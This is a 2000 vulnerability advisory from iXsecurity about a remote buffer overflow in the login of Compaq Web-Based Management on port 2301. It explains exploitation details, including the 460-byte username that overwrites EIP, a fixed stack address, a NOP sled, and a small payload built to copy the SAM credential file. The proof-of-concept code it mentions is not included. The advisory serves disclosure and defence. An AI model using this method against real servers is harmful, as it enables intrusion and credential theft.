iXsecurity Security Vulnerability Report
No: iXsecurity.20001120.compaq-authbo.a
=======================================

Vulnerability Summary
---------------------
Problem:  The authentication of Compaq Web-Based
               Management contains a remotely
               exploitable buffer overflow

Threat:   Anyone that has access to port 2301 on a
               Windows NT server can run arbitrary
               code as Administrators (like RDS)

Affected Software: Compaq Management Agents
               (Software version 4.70 verified)

Verified Platforms: Windows NT SP3 and SP6a

Solution: Install patch

Vulnerability Description
-------------------------
<http://Server.with.CWBM:2301/cpqlogin.htm> is
accessible for everyone by default and contains a
remotely exploitable buffer overflow.

Additional Vulnerability Information
------------------------------------
Compaq Management Agents and Compaq Web-Based Management
is installed by default using the SmartStart CD.
The Web-Based Management binds to port 2301 and the java
applet (on <http://IP:2301/cpqlogin.htm>) that is used for
an user to log in, sends username and encrypted
password to <http://IP:2301/Proxy/LoginResponse>.

Injection

Due to the lack of bounds checking, the user name sent to
this URL can be used to overwrite the EIP. This happens when
the user name is exactly 460 bytes long. If the user name is
more than 460 bytes, but less than (about) 1500 bytes,
another overflow occurs that we cannot currently exploit.
If the user name is over 1500 bytes, an error message is
returned! This is interesting, because it seems like there
is *some* kind of bounds checking after all. It just doesn't
work properly. Before the fatal return instruction, there is
a POP EBP, so EBP is also overwritten.

Our initial research indicates that the stack for this
process is always placed at the virtual address 0x00fdffff
(on Windows NT SP3) and growing up towards lower addresses
(as usual). At the moment, we use this fact to do a direct
jump to the assumed beginning of the buffer. Since we are way
below 452 bytes, we use the spare bytes in the beginning for
a NOP sled.

Payload

With this setup, we have a maximum of 452 bytes to use for
the payload. Barnaby Jack's frequently used (and very nice)
payload vector is closer to 600 bytes, so we take a slightly
different approach. First, we use a datagram socket instead
of a stream socket. That saves us a few bytes. Then we don't
use anonymous pipes and don't return anything to the client.
That makes it less user friendly, but saves us a lot of
bytes. Finally, we use WinExec instead of creating a cmd.exe
process. This saves some bytes. Eventually this affects our
rights, but we can at least still run rdisk and copy the sam
file. That takes us a long way in proof-of-concept terms.

Using this approach we are aldready way below our 453 byte
limit. Actually this code is about 256 bytes. Happy about
reaching the goal directly, we have not even tried to
optimized the code. Therefore it will be easy to get it
even smaller if it is necessary. Drop us a line if you do
it or if you need any help to do it.

Other Information
-----------------
Some Compaq installations have ports 49400 and 49401 open
too. These ports are not verified.
This vulnerability has already been reported to
the Securityfocus Vulnerability Database:

Proof of concept code
---------------------

Comments

This Perl script uses MD5.
This code is using direct jumps. It may not work on your
system. It has only been tested on Windows NT SP3 and SP6a.
When investigating iXsecurity found the password hash
algorithm. This algorithm is used in the code to
create logon cookies. iXsecurity have written a Compaq
cookie password cracker using this algorithm and posted it
to Bugtraq. Bugtraq have chosen not to publish this tool.
